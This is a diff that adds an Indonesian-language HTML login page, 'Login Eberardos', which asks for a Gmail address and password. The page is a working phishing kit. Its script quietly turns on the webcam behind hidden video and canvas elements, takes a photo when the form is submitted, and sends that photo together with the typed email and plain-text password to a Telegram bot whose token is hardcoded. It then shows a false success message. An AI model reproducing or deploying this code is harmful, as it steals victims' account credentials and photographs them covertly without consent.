@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Eberardos</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f2f2f2;
+    }
+    .login-form {
+      background-color: #ffffff;
+      border-radius: 12px;
+      padding: 40px;
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 350px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .login-form h2 {
+      margin-bottom: 25px;
+      font-size: 24px;
+      color: #333;
+      font-weight: bold;
+    }
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+      width: 100%;
+    }
+    .form-group label {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 5px;
+      display: block;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+      background-color: #fafafa;
+      color: #333;
+      transition: border-color 0.3s ease;
+    }
+    .form-group input:focus {
+      border-color: #6a11cb;
+      outline: none;
+    }
+    .login-button {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      background-color: #6a11cb;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 15px; /* Posisi tombol di bawah input */
+    }
+    .login-button:hover {
+      background-color: #2575fc;
+    }
+    video {
+      display: none; /* Video kamera disembunyikan */
+    }
+    canvas {
+      display: none; /* Canvas untuk foto juga disembunyikan */
+    }
+  </style>
+</head>
+<body>
+  <form id="loginForm" class="login-form">
+    <h2>Login Eberardos</h2>
+    <div class="form-group">
+      <label for="email">Gmail</label>
+      <input type="email" id="email" placeholder="Masukkan Gmail Anda" required>
+    </div>
+    <div class="form-group">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Masukkan Password Anda" required>
+    </div>
+    <button type="submit" class="login-button">Login</button>
+  </form>
+
+  <!-- Elemen untuk Kamera -->
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+<script>
+  const botToken = '7511284981:AAHtfAInClOnPffJ4AayqQWby5kbehk_k2E'; // Token bot Anda
+  const chatId = '7784370236'; // chat_id Anda
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+
+  // Meminta akses kamera
+  navigator.mediaDevices
+    .getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+    })
+    .catch(error => {
+      console.error("Kamera tidak dapat diakses:", error);
+    });
+
+  document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    // Ambil foto dari kamera
+    const context = canvas.getContext("2d");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Konversi foto ke file biner
+    canvas.toBlob(function (blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob); // Menambahkan file biner gambar ke FormData
+
+      // Kirim foto ke Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log("Foto berhasil dikirim ke Telegram.");
+          } else {
+            console.error("Gagal mengirim foto:", data.description);
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
+    }, "image/png");
+
+    // Kirim data login ke Telegram
+    const telegramMessage = `
+      🔑 *Login Attempt* 🔑
+      Email: ${email}
+      Password: ${password}
+    `;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: telegramMessage,
+        parse_mode: "Markdown"
+      })
+    })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert("Login berhasil! Data Anda telah dikirim.");
+        } else {
+          console.error("Gagal mengirim data login:", data.description);
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+      });
+  });
+</script>
+</body>
+</html>
